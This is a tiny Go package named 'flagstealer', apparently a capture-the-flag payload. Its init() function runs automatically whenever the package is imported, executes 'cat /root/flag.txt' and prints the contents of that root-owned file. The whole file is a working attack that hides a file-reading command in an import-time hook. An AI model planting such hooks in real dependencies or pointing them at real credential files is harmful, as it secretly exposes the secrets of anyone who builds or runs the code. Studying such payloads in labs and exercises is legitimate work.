package flagstealer

import (
    "os/exec"
    "fmt"
)

func init() {
    cmd := exec.Command("cat", "/root/flag.txt")
    out, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Println("[!] Error reading flag:", err)
    } else {
        fmt.Println("[+] Flag contents:\n" + string(out))
    }
}
